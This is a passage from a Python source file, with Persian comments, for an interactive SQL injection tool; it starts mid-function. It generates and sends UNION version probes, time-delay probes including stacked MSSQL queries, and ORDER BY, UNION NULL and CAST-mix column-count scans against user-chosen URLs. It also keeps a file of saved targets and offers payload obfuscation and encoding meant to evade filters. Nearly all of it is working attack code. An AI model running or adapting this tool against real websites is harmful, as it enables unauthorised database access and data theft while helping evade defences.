        tb_sec = float(input("Time delay seconds (default 2): ").strip() or "2")
        if tb_sec < 1e-3: tb_sec = 2.0
    except:
        tb_sec = 2.0
    try:
        threshold = float(input("Timeout threshold to flag 'delay' (seconds, default 1.2): ").strip() or "1.2")
    except:
        threshold = 1.2

    def _req_builder(payload: str):
        return ic.prepare_injection(payload)

    print("\n[+] Running DBMS hint probes (version/time). We WILL NOT decide; only printing raw outcomes.")
    for name in chosen:
        prof = DBMS_PROFILES[name]
        comment_pool = list(dict.fromkeys(use_comment_styles + prof["comment_styles"]))

        # Version probe via UNION (use version_expr correctly)
        for com in comment_pool:
            vexpr = prof["version_expr"]
            if " FROM " in vexpr.upper():
                # e.g., Oracle: "banner FROM v$version"
                core = f"SELECT {vexpr}"
            else:
                # put version() / @@version in col#1, rest NULL up to max_c
                cols = [vexpr] + (["NULL"] * (max_c - 1))
                core = f"SELECT {','.join(cols)}"
            if prof["needs_dual"] and " FROM " not in vexpr.upper():
                core += " FROM dual"
            pay = f"UNION {core}"
            pay = _apply_quotes(pay, need_quotes)
            pay = _append_comment(pay, com, name)
            rows = _send_and_measure(ic, _req_builder, f"[{name}][version-probe:{com.strip()}]", pay)
            _print_rows(rows)


        if enable_time:
            for com in comment_pool:
                if name == "MSSQL":
                    # Stacked query for MSSQL
                    sec_i = int(round(tb_sec))
                    pay = _stacked_time_payload_mssql(sec_i, need_quotes, com)
                    rows = _send_and_measure(ic, _req_builder, f"[{name}][time-probe:stacked:{com.strip()}]", pay)
                else:
                    tf = prof["time_func"]
                    if "{sec}" in tf:
                        time_expr = tf.format(sec=str(tb_sec))
                    else:
                        time_expr = tf
                    cols = [time_expr] + (["NULL"] * (max_c - 1))
                    core = f"SELECT {','.join(cols)}"
                    if prof["needs_dual"]:
                        core += " FROM dual"
                    pay = f"UNION {core}"
                    pay = _apply_quotes(pay, need_quotes)
                    pay = _append_comment(pay, com, name)
                    rows = _send_and_measure(ic, _req_builder, f"[{name}][time-probe:{com.strip()}]", pay)

                for (label, rk, st, ln, hh, dt, note) in rows:
                    hint = "DELAY" if dt >= threshold else "no-delay"
                    print(f"  -> time-hint: {hint} (thr={threshold}s)")

    print("\n[+] ORDER BY scan (generic, no DBMS-lock-in)")
    for com in use_comment_styles:
        print(f"\n== comment=[{com}] quotes={'yes' if need_quotes else 'no'} ==")
        for i in range(1, max_c + 1):
            pay = f"ORDER BY {i}"
            pay = _apply_quotes(pay, need_quotes)
            pay = _append_comment(pay, com, "generic")
            rows = _send_and_measure(ic, _req_builder, f"[ORDERBY i={i}:{com.strip()}]", pay)
            _print_rows(rows)

    print("\n[+] UNION NULL scan (generic)")
    for com in use_comment_styles:
        print(f"\n== comment=[{com}] quotes={'yes' if need_quotes else 'no'} ==")
        for i in range(1, max_c + 1):
            nulls = _mk_null_list(i)
            pay = f"UNION SELECT {nulls}"
            pay = _apply_quotes(pay, need_quotes)
            pay = _append_comment(pay, com, "generic")
            rows = _send_and_measure(ic, _req_builder, f"[UNION-NULL cols={i}:{com.strip()}]", pay)
            _print_rows(rows)

    print("\n[+] UNION CAST-mix scan (to handle strict type checks)")
    for name in chosen:
        prof = DBMS_PROFILES[name]
        comment_pool = list(dict.fromkeys(use_comment_styles + prof["comment_styles"]))
        for com in comment_pool:
            print(f"\n== {name} CAST-mix  comment=[{com}] quotes={'yes' if need_quotes else 'no'} ==")
            for i in range(1, max_c + 1):
                cols = _mk_cast_mix(i, prof["cast_str"], prof["cast_int"])
                core = f"SELECT {cols}"
                if prof["needs_dual"]:
                    core += " FROM dual"
                pay = f"UNION {core}"
                pay = _apply_quotes(pay, need_quotes)
                pay = _append_comment(pay, com, name)
                rows = _send_and_measure(ic, _req_builder, f"[{name} UNION-CAST cols={i}:{com.strip()}]", pay)
                _print_rows(rows)

    print("\n[Done] Advanced column-count scans finished. Review status/len/hash/time and decide manually.")


# ------------------- Target Manager -------------------
import json as _json

class TargetManager:
    """
    ذخیره، مدیریت و انتخاب تارگت‌ها.
    تارگت‌ها در یک فایل JSON کنار اسکریپت ذخیره می‌شن.
    """
    DEFAULT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "targets.json")

    def __init__(self, filepath: str = None):
        self.filepath = filepath or self.DEFAULT_FILE
        self.targets: list[dict] = []   # [{"label": str, "url": str, "note": str}]
        self._load()

    # ---------- persistence ----------
    def _load(self):
        if os.path.isfile(self.filepath):
            try:
                with open(self.filepath, "r", encoding="utf-8") as f:
                    data = _json.load(f)
                if isinstance(data, list):
                    self.targets = data
            except Exception as e:
                print(f"[!] Could not load targets file: {e}")

    def _save(self):
        try:
            with open(self.filepath, "w", encoding="utf-8") as f:
                _json.dump(self.targets, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"[!] Could not save targets file: {e}")

    # ---------- helpers ----------
    def _print_list(self):
        if not self.targets:
            print("  (no targets saved)")
            return
        print(f"\n{'#':<4} {'Label':<22} {'URL':<50} Note")
        print("-" * 90)
        for i, t in enumerate(self.targets, 1):
            label = (t.get("label") or "")[:20]
            url   = (t.get("url")   or "")[:48]
            note  = (t.get("note")  or "")[:30]
            print(f"{i:<4} {label:<22} {url:<50} {note}")

    def _find_by_label(self, label: str):
        label_l = label.strip().lower()
        for i, t in enumerate(self.targets):
            if (t.get("label") or "").lower() == label_l:
                return i
        return -1

    # ---------- public API ----------
    def add(self, url: str, label: str = "", note: str = "") -> dict:
        """افزودن تارگت جدید؛ اگه label تکراری بود، آپدیت می‌کنه."""
        if not label:
            label = f"target_{len(self.targets)+1}"
        idx = self._find_by_label(label)
        entry = {"label": label, "url": url, "note": note}
        if idx >= 0:
            self.targets[idx] = entry
            print(f"[*] Updated existing target: {label}")
        else:
            self.targets.append(entry)
            print(f"[+] Added target: {label}  ->  {url}")
        self._save()
        return entry

    def remove(self, indices: list[int]) -> int:
        """حذف بر اساس ایندکس ۱-based؛ برمی‌گردونه تعداد حذف‌شده‌ها."""
        to_remove = set()
        for i in indices:
            if 1 <= i <= len(self.targets):
                to_remove.add(i - 1)
        self.targets = [t for j, t in enumerate(self.targets) if j not in to_remove]
        self._save()
        return len(to_remove)

    def get(self, index_1based: int) -> dict | None:
        if 1 <= index_1based <= len(self.targets):
            return self.targets[index_1based - 1]
        return None

    def pick_interactive(self, prompt: str = "Select target") -> dict | None:
        """
        نمایش لیست و گرفتن انتخاب از کاربر.
        برمی‌گردونه dict تارگت انتخاب‌شده یا None.
        """
        if not self.targets:
            print("[-] No saved targets. Add one first (option T).")
            return None
        self._print_list()
        print(f"\n{prompt} (number or label, 0=cancel): ", end="")
        sel = input().strip()
        if sel in ("0", "۰", ""):
            return None
        # سعی عدد
        fa = "۰۱۲۳۴۵۶۷۸۹"; en = "0123456789"
        sel_en = sel.translate(str.maketrans(fa, en))
        try:
            idx = int(sel_en)
            t = self.get(idx)
            if t:
                return t
            print("[-] Index out of range.")
            return None
        except ValueError:
            pass
        # سعی label
        idx = self._find_by_label(sel)
        if idx >= 0:
            return self.targets[idx]
        print(f"[-] No target with label '{sel}'.")
        return None

    # ---------- interactive submenu ----------
    def run_menu(self):
        while True:
            print("\n==== Target Manager ====")
            self._print_list()
            print()
            print("A) Add target")
            print("E) Edit target (label/note)")
            print("D) Delete target(s)")
            print("I) Import targets from file (one URL per line, or JSON)")
            print("X) Export targets list to text file")
            print("0) Back to main menu")
            cmd = input("> ").strip().upper()

            if cmd in ("0", ""):
                break

            elif cmd == "A":
                url = input("URL (must start with http/https): ").strip()
                if not (url.startswith("http://") or url.startswith("https://")):
                    print("[-] Invalid URL.")
                    continue
                label = input("Label (leave blank for auto): ").strip()
                note  = input("Note/description (optional): ").strip()
                self.add(url, label, note)

            elif cmd == "E":
                if not self.targets:
                    print("[-] No targets.")
                    continue
                self._print_list()
                try:
                    idx = int(input("Target number to edit: ").strip())
                    t = self.get(idx)
                    if not t:
                        print("[-] Invalid number.")
                        continue
                except Exception:
                    print("[-] Invalid input.")
                    continue
                print(f"Current label: {t['label']}  |  url: {t['url']}  |  note: {t.get('note','')}")
                new_label = input(f"New label [{t['label']}]: ").strip() or t["label"]
                new_note  = input(f"New note [{t.get('note','')}]: ").strip()
                if not new_note and "note" in t:
                    new_note = t["note"]
                self.targets[idx-1]["label"] = new_label
                self.targets[idx-1]["note"]  = new_note
                self._save()
                print("[+] Updated.")

            elif cmd == "D":
                if not self.targets:
                    print("[-] No targets.")
                    continue
                self._print_list()
                sel = input("Index/range to delete (e.g. 1,3-5 or 'all'): ").strip()
                indices = parse_multi_indices(sel, len(self.targets))
                if not indices:
                    print("[-] Nothing selected.")
                    continue
                removed = self.remove(indices)
                print(f"[+] Removed {removed} target(s).")

            elif cmd == "I":
                path = input("File path: ").strip()
                if not os.path.isfile(path):
                    print("[-] File not found.")
                    continue
                added = 0
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        raw = f.read().strip()
                    # اگه JSON بود
                    if raw.startswith("["):
                        items = _json.loads(raw)
                        for item in items:
                            if isinstance(item, dict) and item.get("url"):
                                self.add(item["url"], item.get("label",""), item.get("note",""))
                                added += 1
                            elif isinstance(item, str) and item.startswith("http"):
                                self.add(item)
                                added += 1
                    else:
                        for line in raw.splitlines():
                            line = line.strip()
                            if line.startswith("http"):
                                self.add(line)
                                added += 1
                except Exception as e:
                    print(f"[-] Import error: {e}")
                print(f"[+] Imported {added} target(s).")

            elif cmd == "X":
                if not self.targets:
                    print("[-] No targets to export.")
                    continue
                out_path = input("Save to (blank = targets_export.txt beside script): ").strip()
                if not out_path:
                    out_path = os.path.join(os.path.dirname(self.filepath), "targets_export.txt")
                try:
                    with open(out_path, "w", encoding="utf-8") as f:
                        for t in self.targets:
                            f.write(f"{t.get('label','')}\t{t['url']}\t{t.get('note','')}\n")
                    print(f"[+] Exported to: {out_path}")
                except Exception as e:
                    print(f"[-] Export error: {e}")

            else:
                print("[-] Unknown command.")


# ------------------- app loop -------------------
def main():
    ic = None
    last_prepared = {}   # label -> request dict
    last_responses = {}  # label -> response body
    obfuscator = Obfuscator()
    targets = TargetManager()

    def ensure_ic():
        nonlocal ic
        while ic is None:
            # اگه تارگت ذخیره شده داریم، اول بپرسیم از لیست بزنه یا دستی بنویسه
            if targets.targets:
                print("\nLoad from saved targets? (y/n, default y): ", end="")
                ans = input().strip().lower()
                if ans in ("", "y", "yes", "ب"):
                    t = targets.pick_interactive("Select target to use")
                    if t:
                        try:
                            ic = InputCollector(t["url"])
                            print(f"[+] Target set: [{t['label']}] {t['url']}")
                            return
                        except Exception as e:
                            print(f"[-] {e}")
                            ic = None
                            continue
            try:
                url = input("Enter target URL: ").strip()
                ic = InputCollector(url)
                # پیشنهاد ذخیره
                save_ans = input("Save this target? (y/n): ").strip().lower()
                if save_ans in ("y", "yes", "ب"):
                    label = input("Label: ").strip()
                    note  = input("Note (optional): ").strip()
                    targets.add(url, label, note)
            except Exception as e:
                print(f"[-] {e}")
                ic = None

    while True:
        cur_target = f"[{ic.url}]" if ic else "[none]"
        print(f"\n==== Main Menu ====  current target: {cur_target}")
        print("── Target Management ──────────────────────────────────────")
        print("T ) Target Manager  (add / list / edit / delete saved targets)")
        print("1 ) Set/Change Target URL  (pick from list or enter manually)")
        print("── Input & Injection ──────────────────────────────────────")
        print("2 ) Select Target Type & Inputs (multi-select, with Back)")
        print("3 ) Prepare Requests (single payload)  [supports {placeholders}]")
        print("4 ) Prepare Requests (dict payloads)   [supports {placeholders}]")
        print("5 ) Send Last Prepared (all, via requests)  [then optionally open in browser]")
        print("6 ) Open in Browser (Playwright) one/many of last prepared")
        print("7 ) Load & Run Payload Dicts from Folder (auto, optional error-scan)")
        print("8 ) Load Error Regex Dicts & Scan Last Responses")
        print("── Scanners ───────────────────────────────────────────────")
        print("10) Blind (user-provided payloads) on selected inputs")
        print("11) Column Count Helper (ORDER BY / UNION NULL)")
        print("12) Data Type Tester (per column)")
        print("13) DB Version Probe (UNION)")
        print("14) DB Info Interactive (UNION builder)")
        print("15) Column Count Helper (Advanced, multi-DBMS, CAST/Time/Boolean-friendly)")
        print("── Settings ───────────────────────────────────────────────")
        print("16) Toggle Injection Mode (append/replace)  [current: {}]".format(getattr(ic, "injection_mode", "append") if ic else "append"))
        print("17) Toggle Cookie Encode Mode (auto/encode/raw)  [current: {}]".format(getattr(ic, "encode_cookies", "auto") if ic else "auto"))
        print("18) Toggle Header Encode Mode (auto/encode/raw)  [current: {}]".format(getattr(ic, "encode_headers", "auto") if ic else "auto"))
        print("19) Toggle Context Mode (raw/json/xml/html/js)  [current: {}]".format(getattr(ic, "context_mode", "raw") if ic else "raw"))
        print("20) Preview Transform of a payload on a selected input")
        print("── Obfuscation ────────────────────────────────────────────")
        print("21) Configure Obfuscation Settings")
        print("22) Apply Obfuscation to Payload")
        print("23) Generate Multiple Obfuscated Variants")
        print("───────────────────────────────────────────────────────────")
        print("9 ) Exit")
        choice = input("> ").strip()

        if choice in ("9", "۹"):
            print("Bye.")
            break

        if choice.upper() == "T":
            targets.run_menu()
            continue

        if choice in ("1", "۱"):
            ic = None
            ensure_ic()
            continue

        if choice in ("2", "۲"):
            ensure_ic()
            while True:
                tt = ic.choose_target_type()
                if tt is None:
                    print("[*] Cancelled.")
                    break
                if tt == "back":
                    print("[*] Back to main menu.")
                    break
                res = ic.collect_inputs()
                if res == "back":
                    print("[*] Back one step.")
                    continue
                if res is True:
                    print("[+] Inputs ready.")
                    break
                print("[-] Nothing prepared. Try again.")
            continue

        if choice in ("3", "۳"):
            ensure_ic()
            if not ic or not ic.prepared_data or not ic.selected_keys:
                print("[-] No inputs selected. Use option 2 first.")
                continue
            raw = input("Enter payload string (e.g., ' or '||(SELECT '' FROM {table})||' ): ").strip()
            if not raw:
                print("[-] Empty payload.")
                continue
            apply_obf = input("Apply obfuscation? (y/n): ").strip().lower()
            if apply_obf in ("y", "yes", "1", "۱"):
                orig_payload = raw
                raw, applied_tech = obfuscator.obfuscate_advanced(raw, char_budget=50)
                print(f"[*] Obfuscated payload: {raw}")
                print(f"[*] Techniques applied: {', '.join(applied_tech)}")
                print(f"[*] Length change: {len(raw) - len(orig_payload)} characters")

            expanded = expand_single_payload_string(raw)
            if not expanded:
                print("[-] No expanded payloads.")
                continue
            prepared = {}
            for label, s in expanded.items():
                built = ic.prepare_injection(s)
                if not built:
                    print(f"[-] Prepare failed for {label}")
                    continue
                prepared.update(built)
            if not prepared:
                print("[-] Prepare failed.")
                continue
            last_prepared.clear(); last_prepared.update(prepared)
            print("\n[Prepared requests]")
            for k, v in last_prepared.items():
                print(k, "->", v)
            continue

        if choice in ("4", "۴"):
            ensure_ic()
            if not ic or not ic.prepared_data or not ic.selected_keys:
                print("[-] No inputs selected. Use option 2 first.")
                continue
            print("Enter dict payloads (label:payload), one per line. Empty line to end.")
            raw_dict = {}
            while True:
                line = input()
                if not line.strip(): break
                if ":" not in line:
                    print("Use format label:payload")
                    continue
                label, p = line.split(":", 1)
                raw_dict[label.strip()] = p.strip()
            if not raw_dict:
                print("[-] No payloads provided.")
                continue
            apply_obf = input("Apply obfuscation to all payloads? (y/n): ").strip().lower()
            if apply_obf in ("y", "yes", "1", "۱"):
                for label, val in list(raw_dict.items()):
                    new_val, applied_tech = obfuscator.obfuscate_advanced(val, char_budget=50)
                    raw_dict[label] = new_val
                    print(f"[*] Obfuscated {label}: {new_val}  (tech: {', '.join(applied_tech)})")
            expanded_dict = expand_payload_dict(raw_dict)
            if not expanded_dict:
                print("[-] No expanded payloads.")
                continue
            prepared = ic.prepare_injection(expanded_dict)
            if not prepared:
                print("[-] Prepare failed.")
                continue
            last_prepared.clear()
            for label, group in prepared.items():
                last_prepared.update(group)
            print("\n[Prepared requests]")
            for k, v in last_prepared.items():
                print(k, "->", v)
            continue

        if choice in ("5", "۵"):
            if not last_prepared:
                print("[-] Nothing prepared to send.")
                continue
            ensure_ic()
            last_responses.clear()
            print("\n[Sending prepared requests...]")
            for idx, (label, req) in enumerate(last_prepared.items(), start=1):
                print(f"\n[{idx}] sending {label}")
                r, dt = timed_send(ic, req)
                if r is not None:
                    body = r.text or ""
                    # print(f"[+] status={r.status_code}, len={len(body)} hash={_short_hash(body)} time={dt:.3f}s (elapsed={r.elapsed.total_seconds():.3f}s)")
                    print(f"[+] status={r.status_code}, len={len(body)} hash={_short_hash(body)} time={dt:.3f}s")
                    last_responses[label] = body
                else:
                    print("[!] request failed")
            prompt_open_results_in_browser(last_prepared)
            continue

        if choice in ("6", "۶"):
            if not last_prepared:
                print("[-] Nothing prepared to open.")
                continue
            prompt_open_results_in_browser(last_prepared)
            continue

        if choice in ("7", "۷"):
            ensure_ic()
            if not ic or not ic.prepared_data or not ic.selected_keys:
                print("[-] No inputs selected. Use option 2 first.")
                continue

            folder = default_folder_input("Enter payloads folder (blank = this program directory, or give subfolder name): ")
            if not os.path.isdir(folder):
                print("[-] Not a directory.")
                continue

            pyfiles = discover_py_files(folder)
            if not pyfiles:
                print("[-] No .py files found.")
                continue

            chosen_file = choose_from_list("Pick a .py file:", pyfiles)
            if chosen_file in (None, "back"):
                continue
            mod = load_module_from_path(chosen_file)
            if not mod:
                continue
            dicts_map = collect_top_level_dicts(mod)
            if not dicts_map:
                print("[-] No top-level dicts in this module.")
                continue

            dict_names = list(dicts_map.keys())
            chosen_dict_name = choose_from_list("Pick a dict name to use as payloads:", dict_names)
            if chosen_dict_name in (None, "back"):
                continue
            payload_dict_raw = dicts_map[chosen_dict_name]
            flat_payloads = flatten_payload_dict(payload_dict_raw)

            expanded = expand_payload_dict(flat_payloads)
            if not expanded:
                print("[-] No expanded payloads.")
                continue

            prepared = ic.prepare_injection(expanded)
            if not prepared:
                print("[-] Prepare failed.")
                continue

            want_err = input("Load error regex dicts from another folder for scanning? (y/n): ").strip().lower()
            compiled_errs = None
            if want_err == "y":
                err_folder = default_folder_input("Enter errors folder (blank = this program directory, or give subfolder name): ")
                if os.path.isdir(err_folder):
                    pyfiles2 = discover_py_files(err_folder)
                    if pyfiles2:
                        chosen_file2 = choose_from_list("Pick a .py file (errors):", pyfiles2)
                        if chosen_file2 not in (None, "back"):
                            mod2 = load_module_from_path(chosen_file2)
                            if mod2:
                                dicts_map2 = collect_top_level_dicts(mod2)
                                if dicts_map2:
                                    err_name = choose_from_list("Pick a dict name (errors):", list(dicts_map2.keys()))
                                    if err_name not in (None, "back"):
                                        compiled_errs = compile_error_patterns(dicts_map2[err_name])

            last_prepared.clear()
            for label, group in prepared.items():
                last_prepared.update(group)

            print("\n[Sending prepared batch...]")
            last_responses.clear()
            for idx, (lbl, req) in enumerate(last_prepared.items(), start=1):
                print(f"\n[{idx}] sending {lbl}")
                r, dt = timed_send(ic, req)  
                if r is not None:
                    body = r.text or ""
                    # print(f"[+] status={r.status_code}, len={len(body)} hash={_short_hash(body)} time={dt:.3f}s (elapsed={r.elapsed.total_seconds():.3f}s)")
                    print(f"[+] status={r.status_code}, len={len(body)} hash={_short_hash(body)} time={dt:.3f}s")
                    if compiled_errs:
                        matches = scan_errors(body, compiled_errs)
                        if matches:
                            print("[ERR-MATCH] Found patterns:")
                            for m in matches:
                                print(f"  - {m['engine']}: {m['pattern']}")
                        else:
                            print("[ERR-MATCH] No regex hits.")
                    last_responses[lbl] = body
                else:
                    print("[!] request failed")


            prompt_open_results_in_browser(last_prepared)
            continue

        if choice in ("8", "۸"):
            if not last_responses:
                print("[-] No responses to scan. Send requests first.")
                continue
            folder = default_folder_input("Enter errors folder (blank = this program directory, or give subfolder name): ")
            if not os.path.isdir(folder):
                print("[-] Not a directory.")
                continue
            pyfiles = discover_py_files(folder)
            if not pyfiles:
                print("[-] No .py files found.")
                continue
            chosen_file = choose_from_list("Pick a .py file (errors):", pyfiles)
            if chosen_file in (None, "back"):
                continue
            mod = load_module_from_path(chosen_file)
            if not mod:
                continue
            dicts_map = collect_top_level_dicts(mod)
            if not dicts_map:
                print("[-] No dicts found.")
                continue
            chosen_dict_name = choose_from_list("Pick a dict name (errors):", list(dicts_map.keys()))
            if chosen_dict_name in (None, "back"):
                continue
            compiled = compile_error_patterns(dicts_map[chosen_dict_name])

            print("\n[Scanning last responses...]")
            for lbl, body in last_responses.items():
                hits = scan_errors(body, compiled)
                if hits:
                    print(f"\n{lbl}:")
                    for h in hits:
                        print(f"  - {h['engine']}: {h['pattern']}")
                else:
                    print(f"\n{lbl}: no regex hits.")
            continue

        if choice in ("10", "۱۰"):
            ensure_ic()
            run_blind_user_payload(ic, obfuscator)
            continue

        if choice in ("11", "۱۱"):
            ensure_ic()
            run_column_counter(ic)
            continue

        if choice in ("12", "۱۲"):
            ensure_ic()
            run_datatype_tester(ic)
            continue

        if choice in ("13", "۱۳"):
            ensure_ic()
            run_version_probe(ic)
            continue

        if choice in ("14", "۱۴"):
            ensure_ic()
            run_db_info_interactive(ic)
            continue

        if choice in ("15", "۱۵"):
            ensure_ic()
            run_column_counter_advanced(ic)
            continue

        if choice in ("16", "۱۶"):
            ensure_ic()
            ic.injection_mode = "replace" if ic.injection_mode == "append" else "append"
            print(f"[*] injection_mode -> {ic.injection_mode}")
            continue

        if choice in ("17", "۱۷"):
            ensure_ic()
            order = ["auto", "encode", "raw"]
            cur = getattr(ic, "encode_cookies", "auto")
            nxt = order[(order.index(cur) + 1) % len(order)] if cur in order else "auto"
            ic.encode_cookies = nxt
            print(f"[*] encode_cookies -> {ic.encode_cookies}")
            continue

        if choice in ("18", "۱۸"):
            ensure_ic()
            order = ["auto", "encode", "raw"]
            cur = getattr(ic, "encode_headers", "auto")
            nxt = order[(order.index(cur) + 1) % len(order)] if cur in order else "auto"
            ic.encode_headers = nxt
            print(f"[*] encode_headers -> {ic.encode_headers}")
            continue

        if choice in ("19", "۱۹"):
            ensure_ic()
            print("Context modes: 1) raw  2) json  3) xml  4) html  5) js")
            sel = input("> ").strip()
            mapping = {"1":"raw","2":"json","3":"xml","4":"html","5":"js"}
            ic.set_context_mode(mapping.get(sel, "raw"))
            continue

        if choice in ("20", "۲۰"):
            ensure_ic()
            if not ic or not ic.prepared_data or not ic.selected_keys:
                print("[-] No inputs selected. Use option 2 first.")
                continue
            keys = ic.selected_keys[:]
            print("\nSelected inputs:")
            for i, k in enumerate(keys, 1):
                print(f"{i}. {k}")
            try:
                idx = to_int_safe(input("Pick input index to preview: "), 1, len(keys)) - 1
            except Exception:
                print("[-] Invalid index.")
                continue
            kname = keys[idx]
            payload = input("Enter a RAW payload to preview: ").strip()
            if not payload:
                print("[-] Empty payload.")
                continue
            prev = ic.preview_transform(kname, payload)
            print("\n[Preview]")
            print("RAW   :", prev["RAW"])
            print("CTX   :", prev["CTX"], f"  (context={ic.context_mode})")
            print("FINAL :", prev["FINAL"])
            continue

        if choice in ("21", "۲۱"):
            print("\n=== Obfuscation Configuration ===")
            print("1) Set Target DBMS")
            print("2) View Available Techniques") 
            print("3) Set Default Intensity")
            print("4) Set Encoding Policy")
            print("5) Set Safety Rules")
            print("6) Back to Main")
            
            obf_choice = input("> ").strip()
            if obf_choice == "1":
                dbms_options = list(obfuscator.dbms_config.keys())
                for i, dbms in enumerate(dbms_options, 1):
                    print(f"{i}. {dbms}")
                try:
                    dbms_sel = to_int_safe(input("Select DBMS: "), 1, len(dbms_options))
                    obfuscator.set_dbms(dbms_options[dbms_sel-1])
                    print(f"[*] DBMS set to: {dbms_options[dbms_sel-1]}")
                except:
                    print("[-] Invalid selection")
                    
            elif obf_choice == "2":
                print("\nAvailable Obfuscation Techniques:")
                for i, tech in enumerate(obfuscator.techniques.keys(), 1):
                    print(f"{i}. {tech}")
                    
            elif obf_choice == "3":
                try:
                    intensity = float(input("Intensity (0.0-1.0): ").strip())
                    if 0.0 <= intensity <= 1.0:
                        obfuscator.default_intensity = intensity
                        print(f"[*] Intensity set to: {intensity}")
                    else:
                        print("[-] Must be between 0.0 and 1.0")
                except:
                    print("[-] Invalid number")
            elif obf_choice == "4":
                print("\nEncoding Policy (comma-separated, e.g., url,html,base64):")
                print("Available: url, html, base64, hex, unicode, double_url")
                policy_input = input("> ").strip()
                if policy_input:
                    policy = [p.strip() for p in policy_input.split(",")]
                    obfuscator.set_encoding_policy(policy)
                    print(f"[*] Encoding policy set to: {policy}")
            elif obf_choice == "5":
                print("\nSafety Rules Configuration:")
                print("1) Toggle token boundary preservation")
                print("2) Set max length increase factor")
                print("3) Back")
                
                safety_choice = input("> ").strip()
                if safety_choice == "1":
                    current = obfuscator.safety_rules["preserve_token_boundaries"]
                    obfuscator.safety_rules["preserve_token_boundaries"] = not current
                    print(f"[*] Token boundary preservation: {not current}")
                elif safety_choice == "2":
                    try:
                        factor = float(input("Max length increase factor (e.g., 2.0): ").strip())
                        obfuscator.safety_rules["max_length_increase"] = factor
                        print(f"[*] Max length increase factor set to: {factor}")
                    except:
                        print("[-] Invalid number")
                        continue
            continue
        
        if choice in ("22", "۲۲"):
            payload = input("Enter payload to obfuscate: ").strip()
            if not payload:
                print("[-] Empty payload")
                continue
                
            print("\nSelect techniques (comma-separated, or 'all'):")
            techniques = list(obfuscator.techniques.keys())
            for i, tech in enumerate(techniques, 1):
                print(f"{i}. {tech}")
                
            tech_sel = input("> ").strip().lower()
            selected_techs = []
            if tech_sel in ("all", "*", ""):
                selected_techs = techniques
            else:
                try:
                    indices = parse_multi_indices(tech_sel, len(techniques))
                    selected_techs = [techniques[i-1] for i in indices]
                except:
                    print("[-] Invalid selection, using all")
                    selected_techs = techniques
            
            try:
                intensity = float(input("Intensity (0.0-1.0) [0.5]: ").strip() or "0.5")
            except:
                intensity = 0.5
                
            obfuscated, applied = obfuscator.obfuscate(payload, selected_techs, intensity)
            print(f"\nOriginal: {payload}")
            print(f"Obfuscated: {obfuscated}")
            print(f"Techniques applied: {', '.join(applied)}")
            
            # ذخیره برای استفاده بعدی
            last_obfuscated = obfuscated
            continue

        if choice in ("23", "۲۳"):
            payload = input("Enter payload to generate variants: ").strip()
            if not payload:
                print("[-] Empty payload")
                continue

            try:
                count = int(input("Number of variants [5]: ").strip() or "5")
            except:
                count = 5

            try:
                intensity = float(input("Intensity (0.0-1.0) [0.5]: ").strip() or "0.5")
            except:
                intensity = 0.5

            variants = obfuscator.generate_variants(payload, count, None, intensity)
            print(f"\nGenerated {len(variants)} variants:")
            for i, variant in enumerate(variants, 1):
                print(f"\n{i}. {variant['payload']}")
                print(f"   Techniques: {', '.join(variant['techniques'])}")
            continue

        print("[-] Invalid choice.")
        continue


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")



